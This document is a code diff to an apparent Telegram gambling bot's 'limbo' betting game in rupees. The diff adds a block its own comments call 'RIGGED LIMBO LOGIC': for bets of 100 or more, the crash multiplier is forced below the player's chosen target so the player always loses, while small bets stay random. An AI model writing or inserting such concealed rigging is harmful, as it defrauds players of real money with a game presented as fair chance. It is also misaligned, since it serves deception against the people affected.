@@ -437,7 +437,19 @@ def cmd_limbo(message):
             return
 
         USER_BALANCES[user_id] -= amount
-        actual_multiplier = round(random.uniform(1.00, 4.00) + (random.randint(1, 6) * 0.4), 2)
+
+        # --- RIGGED LIMBO LOGIC ---
+        # Agar amount 100 ya usse zyada hai, toh actual multiplier target se kam (ya 2.0x ke andar) hi rahega taaki user hamesha lose kare
+        if amount >= 100.0:
+            # Target se kam ya 1.01 se target ke beech random crash karayenge
+            if target > 1.01:
+                actual_multiplier = round(random.uniform(1.01, target - 0.01), 2)
+            else:
+                actual_multiplier = 1.00
+        else:
+            # Chote amounts ke liye normal random
+            actual_multiplier = round(random.uniform(1.00, 4.00) + (random.randint(1, 6) * 0.4), 2)
+
         win = actual_multiplier >= target
 
         if win:
@@ -453,7 +465,7 @@ def cmd_limbo(message):
             color_status = (255, 0, 0)
             status_caption = f"💥 <b>CRASHED BELOW TARGET!</b>\n🔻 Lost: ₹{amount:.2f}"
 
-        # Image ke upar text draw karna (Fast & Centered Multiplier X)
+        # Image ke upar text draw karna (Centered)
         try:
             file_info = bot.get_file(LIMBO_IMAGE_URL)
             downloaded_file = bot.download_file(file_info.file_path)
